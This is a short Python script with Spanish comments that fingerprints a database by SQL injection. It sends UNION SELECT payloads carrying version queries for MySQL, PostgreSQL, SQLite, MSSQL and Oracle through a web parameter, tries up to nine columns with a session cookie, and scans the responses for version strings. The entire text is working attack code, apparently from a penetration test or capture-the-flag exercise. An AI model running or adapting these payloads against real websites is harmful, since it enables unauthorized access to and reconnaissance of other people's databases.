def test_version_extraction():
    """Prueba extraer versión de la base de datos"""
    print("\n" + "="*70)
    print("  EXTRACCIÓN DE VERSIÓN DE BASE DE DATOS")
    print("="*70)
    
    version_queries = [
        ("MySQL", "SELECT @@version"),
        ("MySQL", "SELECT VERSION()"),
        ("PostgreSQL", "SELECT version()"),
        ("SQLite", "SELECT sqlite_version()"),
        ("MSSQL", "SELECT @@VERSION"),
        ("Oracle", "SELECT banner FROM v$version"),
    ]
    
    for db_type, query in version_queries:
        # Probar con diferentes números de columnas
        for cols in range(1, 10):
            payload = f"1 UNION SELECT {','.join([query] + ['NULL']*(cols-1))}"
            params = {"action": "member", "member": payload}
            r = requests.get(URL, params=params, cookies=COOKIE)
            content = r.text
            
            # Buscar números o palabras típicas de versiones
            if any(word in content for word in ['MySQL', 'PostgreSQL', 'SQLite', 'Microsoft', 'Oracle']):
                print(f"[+] ¡Versión encontrada! {db_type}")
                print(f"    Query: {query}")
                print(f"    Columnas: {cols}")
                print(f"    Contenido: {content[:500]}...")
                return
            
            # Buscar números de versión (ej: 8.0, 14.0, etc.)
            version_pattern = r'\b\d+\.\d+\b'
            versions = re.findall(version_pattern, content)
            if versions:
                print(f"[+] Posibles versiones encontradas: {versions}")
                print(f"    Query: {query}")
                print(f"    Columnas: {cols}")
                break
            
            time.sleep(0.3)

test_version_extraction()
